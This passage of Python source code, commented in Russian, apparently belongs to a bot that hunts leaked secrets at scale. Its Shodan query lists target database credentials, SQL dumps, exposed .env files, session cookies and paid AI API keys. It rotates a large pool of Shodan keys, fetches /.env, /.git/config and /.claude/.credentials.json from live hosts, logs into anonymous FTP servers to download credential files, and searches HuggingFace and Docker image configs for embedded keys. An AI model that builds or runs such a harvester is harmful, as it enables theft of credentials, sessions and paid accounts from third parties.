        ('http.html:"mongodb+srv://"', 3),  # mongo Atlas DSN с кредами
        ('http.html:"mongodb://"', 2),
        ('http.html:"rediss://"', 2),  # TLS-redis (upstash и ко)
        ('http.html:"redis://default:"', 3),  # managed redis с юзером default
        ('http.html:"mysql+pymysql://"', 2),
        ('http.html:"postgresql+psycopg2://"', 2),
        ('http.html:"libsql://"', 1),  # turso
        ('http.html:"aws.connect.psdb.cloud"', 2),  # planetscale
        ('http.html:"pooled.db.prisma.io"', 2),  # prisma pooler
        ('http.html:"postgres.vercel-storage.com"', 2),  # vercel pg
        ('http.html:"aivencloud.com" "postgresql://"', 1),  # aiven
        ('http.html:"MYSQL_ROOT_PASSWORD"', 2),
        ('http.html:"POSTGRES_PASSWORD"', 2),
        ('http.html:"MONGO_INITDB_ROOT_PASSWORD"', 1),
        ('http.html:"amqp://"', 1),  # rabbitmq
        # ============ САМИ ДАМПЫ: sql-файлы на открытых хостах ============
        ('http.html:"-- MySQL dump"', 3),  # mysqldump header = полный дамп БД
        ('http.html:"-- PostgreSQL database dump"', 3),  # pg_dump header
        ('http.html:"Dumping data for table"', 2),  # mysqldump body
        ('http.title:"Index of /" ".sql"', 2),  # листинги с sql-дампами
        ('http.title:"Index of /" "dump"', 2),
        ('http.title:"Index of /" "backup"', 1),
        # ============ вебхуки/почта/карго ============
        ('http.html:"discord.com/api/webhooks/"', 2),  # discord вебхуки
        ('http.html:"smtp.resend.com"', 1),
        ('http.html:"smtp.qq.com"', 1),
        ('http.html:"smtp.163.com"', 1),
        ('http.html:"MAIL_PASSWORD"', 2),
        ('http.html:"EMAIL_HOST_PASSWORD"', 2),
        # ============ 🎫 CODEX/CHATGPT-ПОДПИСКИ ============
        ('http.html:".codex/auth.json"', 3),  # Codex CLI креды на вебрутах/в логах
        ('http.title:"Index of /" ".codex"', 2),  # открытые листинги .codex
        ('http.html:"chatgpt.com/backend-api/codex"', 2),  # codex-прокси релеи
        ('http.html:"chatgpt-account-id"', 2),  # codex-прокси конфиги
        ('http.html:"__Secure-next-auth.session-token"', 2),  # chatgpt веб-сессии
        ('http.html:"subscriptionType"', 3),  # claude.json: план ВИДЕН прямо тут
        # ============ 🪣 БАКЕТЫ/ЛИСТИНГИ: прямые дампы ============
        ('http.html:"<ListBucketResult"', 3),  # ОТКРЫТЫЕ S3: .env/.sql качаются
        ('http.title:"Index of /" ".env"', 3),
        ('http.title:"Index of /" "id_rsa"', 2),
        ('port:21 "230" "anonymous"', 2),  # анонимные FTP — классика дампов
        ('port:873 "rsync"', 1),  # rsync-шары
        # ============ 🐘 ENV-ДАМП ВОЛНА: phpinfo / actuator / APP_KEY ============
        ('http.title:"phpinfo()"', 2),  # phpinfo = полный env/$_SERVER дамп
        ('http.html:"propertySources"', 1),  # spring /actuator/env в индексе
        ('http.html:"APP_KEY=base64:"', 2),  # laravel APP_KEY (форж сессий)
        ('http.html:"xoxb-"', 1),  # slack bot tokens
        ('http.html:"MAIL_MAILER=smtp"', 2),  # laravel mail-конфиги (креды рядом)
        # ============ 🎮 ЖИРНЫЕ СЕССИИ + 🤖 AI-ПОДПИСКИ (куки в дампах) ============
        ('http.html:".ROBLOSECURITY"', 2),  # roblox-сессии (ROBUX)
        ('http.html:"steamLoginSecure"', 2),  # steam-сессии
        ('http.html:"WorkosCursorSessionToken"', 2),  # Cursor Pro сессии!
        ('http.html:"MSPAuth="', 1),  # Microsoft Copilot/Office сессии
        ('http.html:"reddit_session"', 1),
        ('http.html:"sb-" "-auth-token="', 1),  # supabase auth куки (Lovable/Bolt)
        ('http.html:"sessionid" "instagram.com"', 1),  # instagram-сессии
        ('http.html:"auth_token" "twitter.com"', 1),  # X-сессии (= Grok доступ)
        ('http.html:"m-b=" "poe.com"', 1),  # Poe сессии (Claude+GPT)
        # ============ 💎 ПРЯМЫЕ КЛЮЧ-СТРОКИ (платные ключи в теле страниц) ============
        ('http.html:"sk-proj-"', 3),  # OpenAI project keys — самые платные
        ('http.html:"sk-ant-api03"', 3),  # Anthropic API keys
        ('http.html:"sk-or-v1-"', 2),  # OpenRouter
        (
            'http.html:"SUPABASE_SERVICE_ROLE_KEY"',
            2,
        ),  # service_role = полный доступ к БД (обходит RLS!)
        ('http.html:"service_role" "supabase"', 1),
        ('http.html:"AZURE_OPENAI_API_KEY"', 2),  # Azure OpenAI = КОРПОРАТИВНЫЕ жирные
        ('http.html:"openai.azure.com" "api-key"', 2),
        ('http.html:"AWS_SECRET_ACCESS_KEY"', 1),  # AWS = облако
        ('http.html:"BEGIN PRIVATE KEY"', 1),  # GCP service accounts / приватники
        ('http.html:"OPENAI_API_KEY" "sk-"', 1),
        ('http.html:"ANTHROPIC_API_KEY" "sk-ant"', 1),
        # ============ 🚀 GLM/Kimi/ПРОВАЙДЕР-ДАМПЫ (экспансия 2026-09-10) ============
        ('http.html:"ZHIPU_API_KEY"', 2),  # zhipu/GLM официал
        ('http.html:"BIGMODEL"', 1),
        ('http.html:"open.bigmodel.cn"', 2),
        ('http.html:"MOONSHOT_API_KEY"', 2),  # Kimi официал
        ('http.html:"api.moonshot.cn" "sk-"', 2),
        ('http.html:"SILICONFLOW_API_KEY"', 1),
        ('http.html:"BASETEN_API_KEY"', 2),  # baseten: GLM/Kimi инференс
        ('http.html:"inference.baseten.co"', 1),
        ('http.html:"DEEPINFRA_API_KEY"', 1),
        ('http.html:"NOVITA_API_KEY"', 1),
        ('http.html:"CEREBRAS_API_KEY"', 1),
        ('http.html:"SAMBANOVA_API_KEY"', 1),
        ('http.html:"CHUTES_API_KEY"', 1),
        ('http.html:"HYPERBOLIC_API_KEY"', 1),
        ('http.html:"DASHSCOPE_API_KEY"', 1),  # qwen официал
        ('http.html:"STEPFUN_API_KEY"', 1),
        ('http.html:"MINIMAX_API_KEY"', 1),
        ('http.html:"DOUBAO_API_KEY"', 1),  # volces ark
        ('http.html:"OPENROUTER_API_KEY" "sk-or-"', 2),
        ('http.html:"GROQ_API_KEY" "gsk_"', 1),
        ('http.html:"DEEPSEEK_API_KEY" "sk-"', 2),
        ('http.html:"MOONSHOT"', 1),
        # ============ 🧰 OSINT-ВОЛНА (секретс-менеджеры/облака/платёжки) ============
        ('http.html:"dp.pt."', 2),  # Doppler — ВСЕ секреты орга
        ('http.html:"hvs."', 1),  # HashiCorp Vault токены
        ('http.html:"atlasv1"', 2),  # Terraform Cloud (state = секреты инфры)
        ('http.html:"dop_v1_"', 2),  # DigitalOcean
        ('http.html:"PMAK-"', 2),  # Postman = коллекции с чужими ключами
        ('http.html:"sq0atp-"', 1),  # Square платежи
        ('http.html:"dckr_pat_"', 1),  # Docker Hub (приватные образы с ENV)
        ('http.html:"dapi" "databricks"', 1),
        ('http.html:"hooks.slack.com/services"', 1),
        ('http.html:"ATATT3xFfGF0"', 1),  # Atlassian
        ('http.html:"rubygems_"', 1),
        ('http.html:"AKCp"', 1),  # JFrog
        ('http.html:"-us" "mailchimp"', 1),
        ('http.html:"SSWS "', 1),  # Okta admin
        ('http.html:"ya29."', 1),  # Google OAuth access tokens
        ('http.html:"EAA" "facebook"', 1),
        ('http.html:"xapp-1-"', 1),  # slack app-level
        ('http.html:"NRAA-" OR "NRAK-"', 1),  # New Relic
    ]

    def _key_pool(self):
        """Ключи: файл пула (edu 198k) > конфиг shodan_key. Форматы файла:
        dict {"accounts":[{key, query_credits, ...}]} ИЛИ голый list [{...}].
        Поле ключа: "key" или "api_key" (P0.3 — покрываем оба)."""
        pool = []
        try:
            data = json.load(open(SHODAN_KEYS_FILE, encoding="utf-8"))
            accs = data.get("accounts", []) if isinstance(data, dict) else data
            for acc in accs:
                if not isinstance(acc, dict):
                    continue
                k = acc.get("key") or acc.get("api_key")
                qc = acc.get("query_credits", 0) or 0
                if k and qc > 10:
                    pool.append((k, qc))
            pool.sort(key=lambda x: -x[1])
        except Exception:
            pass
        if CFG.get("shodan_key") and not any(k == CFG["shodan_key"] for k, _ in pool):
            pool.append((CFG["shodan_key"], 1))
        return [k for k, _ in pool]

    # probe.py-метод: у хостов с LLM-следами в баннере ключи часто лежат
    # не в баннере, а в /.env, конфигах и robots.txt — тянем напрямую.
    SCRAPE_PATHS = (
        "/.env",
        "/.env.local",
        "/.env.production",
        "/.env.bak",
        "/.env.old",  # бэкапы .env — классика мисконфига
        "/.env.save",
        "/.env.backup",
        "/config.json",
        "/robots.txt",
        "/.git/config",
        "/.credentials.json",
        "/.claude/.credentials.json",
        "/cookies.txt",  # экспортнутые куки (netscape-формат)
        "/access.log",  # лог-дампы с Cookie:-заголовками юзеров
        # 🔷 baseten/truss: конфиги truss CLI на вебрутах (8.32 api_key)
        "/.trussrc",
        "/trussrc",
        "/.config/truss/.trussrc",
        # 🎫 codex: auth.json на вебрутах (ChatGPT-подписки)
        "/.codex/auth.json",
        "/codex/auth.json",
        "/auth.json",
        # 🐘 phpinfo(): $_SERVER/env секция вываливает ВСЕ переменные окружения
        # (API-ключи, DB-креды) — один из самых жирных мисконфигов PHP
        "/phpinfo.php",
        "/info.php",
        "/php_info.php",
        "/test.php",
        "/pinfo.php",
        # 🍃 Spring Boot Actuator: /actuator/env = полный дамп env-переменных
        "/actuator/env",
        "/actuator/configprops",
        # 📝 WordPress: бэкапы wp-config (DB + AUTH_KEY/SALT + часто API-ключи)
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.php.txt",
        "/wp-config.php.swp",
        # 🐘 Laravel: логи с токенами/кредами в stacktrace
        "/storage/logs/laravel.log",
        "/log.log",
        # 📘 Swagger/OpenAPI: в examples/servers часто живые ключи + база API
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/v2/api-docs",
        "/swagger/v1/swagger.json",
        # 🔧 Jenkins: consoleText последнего билда — env-дамп с секретами
        "/lastBuild/consoleText",
    )

    def _live_scrape(self, hosts, time_cap=170):
        out = []
        if not hosts:
            return out
        # АУДИТ-фикс: scrape работал БЕЗ дедлайна (64 хоста × 37 путей × 6с /
        # 24 воркера ≈ +590с ПОВЕРХ shodan_budget) — весь fetch вываливался
        # за source_timeout, результаты выбрасывались, источник ловил
        # health-strike'и и периодически банился на 5 циклов. Жёсткий cap.
        dl = time.time() + time_cap

        def scrape(hp):
            scheme, host, port = hp
            if not host:
                return []
            base = "%s://%s:%s" % (scheme, host, port)
            texts = []
            for path in self.SCRAPE_PATHS:
                if time.time() > dl:
                    break
                try:
                    r = requests.get(base + path, timeout=(2, 4), verify=False)
                    if r.status_code == 200 and len(r.text) > 10:
                        t = r.text[:300_000]
                        if any(
                            m in t
                            for m in (
                                "sk-",
                                "api_key",
                                "API_KEY",
                                "AIza",
                                "gsk_",
                                "hf_",
                                "oat01",
                                "ort01",
                                "sid01",
                                "claudeAiOauth",
                                "oauthAccount",
                                "sessionKey",
                                "refreshToken",
                                # 🍪 куки-волна
                                "Cookie:",
                                "laravel_session",
                                "wordpress_logged_in_",
                                "PHPSESSID",
                                "JSESSIONID",
                                ".ASPXAUTH",
                                "grafana_session",
                                "Netscape HTTP Cookie File",
                                "access_token",
                                # 🐘 phpinfo / spring / wp-config / laravel-логи
                                "PHP Version",
                                "propertySources",
                                "DB_PASSWORD",
                                "APP_KEY",
                                "AUTH_KEY",
                                "MAIL_PASSWORD",
                                "SECRET",
                                "password",
                                "Bearer ",
                                "AKIA",
                                "xoxb-",
                                "glpat-",
                                # "ms-" убран: матчит CSS -ms- префикс = половина
                                # интернета проходила фильтр впустую
                            )
                        ):
                            texts.append((t, "shodan-live:%s%s" % (base, path)))
                except Exception:
                    continue
            return texts

        with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
            futs = [ex.submit(scrape, h) for h in hosts]
            for f in concurrent.futures.as_completed(futs):
                if time.time() > dl:
                    break  # дедлайн: остаток хостов в следующий цикл
                try:
                    out.extend(f.result(timeout=max(1, dl - time.time())))
                except Exception:
                    continue
        if out:
            log("  [shodan] live-scrape: %d файлов с ключами" % len(out))
        return out

    def _alive_pool(self, keys):
        """Live-фильтр пула: /api-info, только ключи с кредитами.
        Файл пула врёт (дев-ключи показывают 100, реально 0) — мёртвые
        лейны съедали 5/6 запросов цикла. Теперь ВСЕ запросы идут по живым
        ключам (edu 194k кредитов = жрём на полную)."""
        alive = []
        for k in keys:  # безлимит: проверяем ВЕСЬ пул (было keys[:12] — хвост
            # пула никогда не валидировался и не использовался)
            try:
                r = requests.get(
                    "https://api.shodan.io/api-info",
                    params={"key": k},
                    timeout=(4, 8),
                    verify=False,
                )
                if r.status_code == 200 and (r.json().get("query_credits") or 0) > 0:
                    alive.append(k)
            except Exception:
                continue
        return alive if alive else keys[:1]

    def fetch(self):
        keys = self._key_pool()
        if not keys:
            return []
        # МАКС: мёртвые лейны не съедают запросы — только живые ключи
        keys = self._alive_pool(keys)
        out = []
        # ПАРАЛЛЕЛЬНОСТЬ: раскладываем запросы по топ-ключам (до 6 одновременно)
        # = Nx объём за то же время (у edu 198k кредитов — жрём на полную)
        cycle_idx = int(time.time() // 600)
        # Rotate the working window across the whole pool (до 8 лейнов —
        # безлимит-режим: больше лейнов = больше страниц за цикл).
        if len(keys) > 8:
            key_offset = cycle_idx % len(keys)
            multi_keys = [keys[(key_offset + i) % len(keys)] for i in range(8)]
        else:
            multi_keys = keys
        lock = threading.Lock()
        live_hosts = []  # (scheme, ip, port) для live-scrape
        # 🔥 БЕЗЛИМИТ (edu 198k кредитов): ВСЕ запросы КАЖДЫЙ цикл — никаких
        # партий по 60. Глубина пагинации множится shodan_page_mult (дефолт x2),
        # офсет-ротация по-прежнему гоняет окно по бэклогу выдачи, так что
        # каждые 10 минут страницы сдвигаются и покрывается вся история.
        # Подписочные (Pro/Max/OAuth) идут ПЕРВЫМИ каждый цикл — гарантированный
        # охват. Остальные стартуют со сдвига cycle_idx*97 (взаимно простое с
        # длиной списка): иначе при дедлайне хвост списка голодал бы навсегда.
        PIN = (
            "setup_token",
            "sk-ant-oat01",
            "claudeAiOauth",
            "sk-ant-sid01",
            "sk-ant-ort01",
            "oauthAccount",
            ".credentials.json",
            "sessionKey",
            "sk-ant-admin01",
            "expiresAt",
            "subscriptionType",
            # 💎 прямые ключ-строки — самые платные находки, каждый цикл
            "sk-proj-",
            "sk-ant-api03",
            "SUPABASE_SERVICE_ROLE_KEY",
            "AZURE_OPENAI_API_KEY",
        )
        # дедуп запросов (в списке были дубли: ANTHROPIC_BASE_URL x2,
        # .claude.json x2, DATABASE_URL/MAIL_PASSWORD разной глубины —
        # каждая копия жгла кредиты дважды за цикл)
        _seen_q = set()
        _uq = []
        for _qd in self.QUERIES:
            if _qd[0] in _seen_q:
                continue
            _seen_q.add(_qd[0])
            _uq.append(_qd)
        pinned = [qd for qd in _uq if any(p in qd[0] for p in PIN)]
        rest = [qd for qd in _uq if qd not in pinned]
        if rest:
            shift = (cycle_idx * 97) % len(rest)
            rest = rest[shift:] + rest[:shift]
        active = pinned + rest
        # 🧬 САМООБУЧЕНИЕ -> SHODAN: форматы, выученные ботом из горячих
        # github-находок (evolve_from_text/мутатор), конвертируются в
        # shodan-запросы. Бот сам расширяет свою охоту по всем движкам.
        try:
            for eq in evolved_queries_for_rotation(10):
                m = re.search(r'"([^"]+)"', eq)
                if not m:
                    continue
                sq = 'http.html:"%s"' % m.group(1)
                if all(sq != q for q, _ in active):
                    active.append((sq, 2))
        except Exception:
            pass
        page_mult = max(1, int(CFG.get("shodan_page_mult", 2)))
        shodan_budget = int(CFG.get("shodan_budget", 660))
        pages_done = {"n": 0}

        def _get_page(key, q, real_page):
            """Одна страница выдачи. 429 != конец кредитов — это per-second
            rate-limit ключа: бэкофф и ретрай (раньше молча рвали страницу).
            shodan блокирует прокси (CF-челлендж) -> прямой requests."""
            for attempt in range(3):
                try:
                    r = requests.get(
                        "https://api.shodan.io/shodan/host/search",
                        params={"key": key, "query": q, "page": real_page},
                        timeout=(10, 30),
                        verify=False,
                    )
                except Exception:
                    return None
                if r.status_code == 429:
                    time.sleep(3 + attempt * 3)
                    continue
                return r
            return None

        def run_queries(q_list, key, shared_out=None):
            # shared_out: инкрементальный слив результатов в ОБЩИЙ список —
            # раньше лейн, упершийся в таймаут фьючи, ТЕРЯЛ всё собранное
            res = []
            sink = shared_out if shared_out is not None else res

            def _emit(item):
                if shared_out is not None:
                    with lock:
                        shared_out.append(item)
                else:
                    res.append(item)

            deadline = time.time() + shodan_budget
            for q, pages in q_list:
                if time.time() >= deadline:
                    break
                pages = min(pages * page_mult, 12)  # безлимит: глубже пагинация
                offset = (cycle_idx * pages) % 90 if pages >= 3 else 0
                try:
                    for page in range(1, pages + 1):
                        if time.time() >= deadline:
                            break
                        real_page = page + offset
                        if real_page > 100:
                            break  # shodan deep-paging cap (10k результатов)
                        r = _get_page(key, q, real_page)
                        if r is None:
                            break
                        if r.status_code in (402, 403):
                            return res  # кредиты кончились (402 = out of credits,
                            # было: ждали только 403 -> лейн молча жёг остаток цикла)
                        if r.status_code != 200:
                            break
                        with lock:
                            pages_done["n"] += 1
                        time.sleep(
                            0.35
                        )  # per-key pace — под потолком 1req/сек, меньше 429
                        j = r.json()
                        matches = j.get("matches") or []
                        if not matches:
                            break
                        for match in matches:
                            html_txt = (match.get("http") or {}).get("html") or ""
                            if html_txt and (
                                re.search(r"(?<![\w/=-])ms-[0-9a-f]{8}-", html_txt)
                                or any(
                                    m in html_txt
                                    for m in (
                                        "sk-",
                                        "gsk_",
                                        "hf_",
                                        "AIza",
                                        "nvapi-",
                                        "glpat-",
                                        "github_pat_",
                                        "ghp_",
                                        "gho_",
                                        "pplx-",
                                        "r8_",
                                        "vck_",
                                        "jina_",
                                        "sk_live_",
                                        "rk_live_",
                                        "tgp_v1_",
                                        "csk-",
                                        "sbp_",
                                        "oat01",
                                        "ort01",
                                        "sid01",
                                        "setup_token",
                                        "API_KEY",
                                        "api_key",
                                        # 🍪 куки-волна: пропускаем сессионный контент
                                        "Cookie:",
                                        "laravel_session",
                                        "wordpress_logged_in_",
                                        "wordpress_sec_",
                                        "PHPSESSID",
                                        "JSESSIONID",
                                        "ASP.NET_SessionId",
                                        ".ASPXAUTH",
                                        "grafana_session",
                                        "connect.sid",
                                        "Netscape HTTP Cookie File",
                                        "access_token",
                                        "refresh_token",
                                        "Set-Cookie:",
                                        "sessionKey",
                                        "session_id",
                                        # 🎫 codex/подписки/дампы: структурные маркеры
                                        "subscriptionType",
                                        "chatgpt-account-id",
                                        "__Secure-next-auth",
                                        "ListBucketResult",
                                        "auth.json",
                                        "id_token",
                                    )
                                )
                            ):
                                _emit(
                                    (
                                        html_txt,
                                        "shodan:%s:%s"
                                        % (match.get("ip_str"), match.get("port")),
                                    )
                                )
                                with lock:
                                    if (
                                        len(live_hosts) < 400
                                    ):  # безлимит: шире окно scrape
                                        live_hosts.append(
                                            (
                                                "https"
                                                if (
                                                    match.get("ssl")
                                                    or match.get("port") in (443, 8443)
                                                )
                                                else "http",
                                                match.get("ip_str"),
                                                match.get("port"),
                                            )
                                        )
                except Exception:
                    continue
            return res

        if len(multi_keys) > 1:
            # round-robin распределение запросов по ключам
            buckets = [[] for _ in multi_keys]
            for i, qd in enumerate(active):
                buckets[i % len(multi_keys)].append(qd)
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=len(multi_keys)
            ) as ex:
                futs = {
                    ex.submit(run_queries, buckets[i], k, out): k
                    for i, k in enumerate(multi_keys)
                }
                for fut in concurrent.futures.as_completed(futs):
                    try:
                        fut.result(timeout=shodan_budget + 60)
                    except Exception:
                        # лейн-таймаут: частичные результаты УЖЕ в out
                        # (shared sink) — больше ничего не теряем
                        continue
        else:
            out = run_queries(active, keys[0])
        log(
            "  [shodan] безлимит: %d запросов × до %d стр (mult x%d), страниц: %d, лейнов: %d"
            % (len(active), 12, page_mult, pages_done["n"], len(multi_keys))
        )
        # LIVE-SCRAPE: дедуп по ip, топ-64 хостов за цикл (безлимит-режим)
        seen_ip = set()
        uniq = []
        for h in live_hosts:
            if h[1] and h[1] not in seen_ip:
                seen_ip.add(h[1])
                uniq.append(h)
        try:
            out.extend(self._live_scrape(uniq[:64]))
        except Exception:
            pass
        return out


class AnonFtp(Source):
    """🚪 АНОНИМНЫЕ FTP/NAS — охота там, где НЕТ конкурентов: люди бэкапят
    AppData/документы на домашние NAS с anon-login, и там лежат
    .claude/.credentials.json, .codex/auth.json, куки, .env, *.sql.
    Нет авто-отзыва (это не github) — сессии живут НЕДЕЛЯМИ. Shodan даёт
    хосты с "230" (anonymous ok), ftplib (stdlib) обходит каталоги и тянет
    файлы по жирным именам. Зеркала дистрибутивов скипаем — там ключа нет."""

    name = "anon-ftp"
    JUICY = re.compile(
        r"(?i)(\.env($|\.)|\.credentials\.json|auth\.json|id_rsa$|\.sql$|"
        r"backup|dump|\.claude|\.codex|cookies?\.|cookie|shadow$|"
        r"config\.(json|ya?ml|php|inc|xml)|database\.(sql|db)|"
        r"tokens?\.(json|txt)|session|\.har$|\.kube(config)?|"
        r"trussrc|\.trussrc|\.codex)"
    )
    SKIP_DIR = re.compile(
        r"(?i)/?(pub|public|incoming|uploads?|debian|ubuntu|centos|mirror(s)?|"
        r"distrib|packages|repo|linux|gnu|freebsd|openbsd|arch|fedora|epel|"
        r"rpm|deb|kernel|cpan|ctan|texlive)(/|$)"
    )

    def _targets(self, n=12):
        # живой пул (было: keys[0] — мёртвый ключ убивал весь FTP-источник)
        keys = Shodan()._alive_pool(Shodan()._key_pool())
        if not keys:
            return []
        page = 1 + (int(time.time() // 900) % 40)
        try:
            r = requests.get(
                "https://api.shodan.io/shodan/host/search",
                params={"key": keys[0], "query": 'port:21 "230"', "page": page},
                timeout=(10, 30),
                verify=False,
            )
            if r.status_code != 200:
                return []
            return [
                m.get("ip_str")
                for m in (r.json().get("matches") or [])
                if m.get("ip_str")
            ][:n]
        except Exception:
            return []

    def _crawl(self, ip, deadline):
        import ftplib

        out = []
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=6)
            ftp.login("anonymous", "nyx@hunt.local")
        except Exception:
            return out
        seen_dirs = set()
        queue = ["/"]
        files = []
        while queue and len(seen_dirs) < 25 and time.time() < deadline:
            d = queue.pop(0)
            if d in seen_dirs or self.SKIP_DIR.search(d):
                continue
            seen_dirs.add(d)
            try:
                names = ftp.nlst(d)[:120]
            except Exception:
                continue
            for name in names:
                base = name.rsplit("/", 1)[-1]
                if not base or base in (".", ".."):
                    continue
                path = name if name.startswith("/") else (d.rstrip("/") + "/" + base)
                if self.JUICY.search(base):
                    files.append(path)
                elif "." not in base and len(queue) < 12:
                    queue.append(path)
        for path in files[:6]:
            if time.time() >= deadline:
                break
            try:
                buf = []
                ftp.retrbinary("RETR " + path, buf.append, blocksize=8192)
                raw = b"".join(buf)
                if 20 < len(raw) < 400_000:
                    out.append(
                        (
                            raw.decode("utf-8", errors="replace"),
                            "anon-ftp:%s%s" % (ip, path),
                        )
                    )
            except Exception:
                continue
        try:
            ftp.quit()
        except Exception:
            pass
        return out

    def fetch(self):
        out = []
        targets = self._targets()
        if not targets:
            return out
        deadline = time.time() + 200
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
            futs = [ex.submit(self._crawl, ip, deadline) for ip in targets]
            for f in concurrent.futures.as_completed(futs):
                try:
                    out.extend(f.result())
                except Exception:
                    continue
        if out:
            log("  [anon-ftp] %d файлов с %d FTP" % (len(out), len(targets)))
        return out


class HFSearch(Source):
    """🤗 HF FULL-TEXT (/api/search/full-text): глобальный поиск по ВСЕМ
    файлам huggingface (spaces/datasets/models) — бесплатно, без ключа, и для
    охоты за ключами его почти НИКТО не парсит. Токенизация meilisearch рвёт
    фразы на подчёркиваниях — запросы подобраны боем (oat01=35 хитов,
    claudeAiOauth=278, DATABASE_URL postgresql=2044)."""

    name = "hf-search"
    QUERIES = [
        "oat01",
        "ort01",
        "api03 sk-ant",
        "refreshToken claudeAiOauth",
        "DATABASE_URL postgresql",
        "AIzaSy",
        "xoxb",
        "svcacct",
        "sid01 sk-ant",
        "setup_token sk-ant",
        "mongodb srv",
        "npg neon",
        "basetenApiKey",
        "trussrc",
        "BASETEN_API_KEY",
    ]

    def fetch(self):
        import urllib.parse

        out = []
        rot = int(time.time() // 900)
        qs = [self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(3)]
        deadline = time.time() + 120
        for q in qs:
            if time.time() >= deadline:
                break
            for typ, seg in (
                ("space", "spaces"),
                ("dataset", "datasets"),
                ("model", ""),
            ):
                try:
                    url = (
                        "https://huggingface.co/api/search/full-text"
                        "?q=%s&type=%s&limit=20" % (urllib.parse.quote(q), typ)
                    )
                    r = http(
                        "GET",
                        url,
                        timeout=(6, 15),
                        headers={"Accept": "application/json"},
                    )
                    if r.status_code != 200:
                        continue
                    hits = r.json().get("hits") or []
                    for hit in hits[:10]:
                        owner = hit.get("repoOwner")
                        repo = hit.get("repoName")
                        path = hit.get("fileName")
                        if not owner or not repo or not path:
                            continue
                        raw_url = "https://huggingface.co/%s/resolve/main/%s" % (
                            ("%s/%s/%s" % (seg, owner, repo))
                            if seg
                            else ("%s/%s" % (owner, repo)),
                            path,
                        )
                        try:
                            rr = http("GET", raw_url, timeout=(6, 15))
                            if rr.status_code == 200 and 20 < len(rr.text) < 400_000:
                                out.append(
                                    (
                                        rr.text,
                                        "hf-search:%s/%s/%s" % (owner, repo, path),
                                    )
                                )
                        except Exception:
                            continue
                except Exception:
                    continue
        if out:
            log("  [hf-search] %d файлов" % len(out))
        return out


class BasetenHunter(Source):
    """🔷 BASETEN-СПЕЦОХОТА (реверс 2026-09-09): паблик-код для baseten-ключей
    выжжен (редкий провайдер). Живые норы: 1) docker-образы с запечённым ENV
    (hub search -> manifest -> config blob — там ЛИТЕРАЛЫ, не ссылки), 2)
    grep.app литеральное присвоение, 3) HF-спейсы. Ключ: 8.32 alnum с точкой.
    Ротация по циклам."""

    name = "baseten-hunter"
    K832 = re.compile(r"\b[A-Za-z0-9]{8}\.[A-Za-z0-9]{32}\b")

    def _docker(self, deadline):
        out = []
        try:
            rot = int(time.time() // 1800)
            r = requests.get(
                "https://hub.docker.com/v2/search/repositories/",
                params={"query": "baseten", "page_size": 50},
                timeout=(8, 20),
                verify=False,
            )
            repos = [
                x.get("repo_name")
                for x in (r.json().get("results") or [])
                if x.get("repo_name") and "/" in x.get("repo_name")
            ]
            if not repos:
                return out
            start = (rot * 10) % len(repos)
            repos = [
                repos[(start + i) % len(repos)] for i in range(min(10, len(repos)))
            ]
        except Exception:
            return out

        def inspect(repo):
            found = []
            try:
                tags_r = requests.get(
                    "https://hub.docker.com/v2/repositories/%s/tags" % repo,
                    params={"page_size": 1},
                    timeout=(6, 12),
                    verify=False,
                )
                tags = [
                    t.get("name")
                    for t in (tags_r.json().get("results") or [])
                    if t.get("name")
                ]
                for tag in tags[:1]:
                    tk = requests.get(
                        "https://auth.docker.io/token",
                        params={
                            "service": "registry.docker.io",
                            "scope": "repository:%s:pull" % repo,
                        },
                        timeout=(6, 12),
                        verify=False,
                    ).json()["token"]
                    man = requests.get(
                        "https://registry-1.docker.io/v2/%s/manifests/%s" % (repo, tag),
                        headers={
                            "Authorization": "Bearer " + tk,
                            # + manifest-list/OCI-index: современные теги отдают
                            # СПИСОК манифестов (без него multi-arch = мимо)
                            "Accept": "application/vnd.docker.distribution.manifest.v2+json,"
                            "application/vnd.oci.image.manifest.v1+json,"
                            "application/vnd.docker.distribution.manifest.list.v2+json,"
                            "application/vnd.oci.image.index.v1+json",
                        },
                        timeout=(6, 15),
                        verify=False,
                    )
                    if man.status_code != 200:
                        continue
                    mj = man.json()
                    dg = (mj.get("config") or {}).get("digest")
                    if not dg and mj.get("manifests"):
                        # manifest-list: берём amd64/linux (или первый не-attest)
                        sub = None
                        for m0 in mj["manifests"]:
                            plat = m0.get("platform") or {}
                            if plat.get("os") in (None, "unknown"):
                                continue  # buildx attestation — не конфиг
                            if plat.get("architecture") == "amd64":
                                sub = m0
                                break
                            sub = sub or m0
                        if sub and sub.get("digest"):
                            man2 = requests.get(
                                "https://registry-1.docker.io/v2/%s/manifests/%s"
                                % (repo, sub["digest"]),
                                headers={
                                    "Authorization": "Bearer " + tk,
                                    "Accept": "application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json",
                                },
                                timeout=(6, 15),
                                verify=False,
                            )
                            if man2.status_code == 200:
                                dg = (man2.json().get("config") or {}).get("digest")
                    if not dg:
                        continue
                    blob = requests.get(
                        "https://registry-1.docker.io/v2/%s/blobs/%s" % (repo, dg),
                        headers={"Authorization": "Bearer " + tk},
                        timeout=(6, 15),
                        verify=False,
                    )
                    if blob.status_code == 200 and "baseten" in blob.text.lower():
                        found.append(
                            (blob.text[:400_000], "baseten-docker:%s:%s" % (repo, tag))
                        )
            except Exception:
                pass
            return found

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            for res in ex.map(inspect, repos):
                out.extend(res)
        return out

    def _grepapp(self):
        out = []
        import html as _html

        rot = int(time.time() // 1800)
        queries = ["BASETEN_API_KEY", "inference.baseten.co Api-Key", "trussrc"]
        q = queries[rot % len(queries)]
        try:
            r = requests.get(
                "https://grep.app/api/search",
                params={"q": q, "regexp": "false", "page": 1 + (rot % 3)},
                timeout=(8, 20),
                verify=False,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            if r.status_code != 200:
                return out
            for h in ((r.json().get("hits") or {}).get("hits") or [])[:25]:
                # grep.app schema: repo/branch/path = {"raw": "..."} объекты
                def _raw(x, default=""):
                    if isinstance(x, dict):
                        return x.get("raw") or default
                    return x or default

                repo = _raw(h.get("repo"))
                branch = _raw(h.get("branch"), "master")
                path = _raw(h.get("path"))
                snip = (h.get("content") or {}).get("snippet") or ""
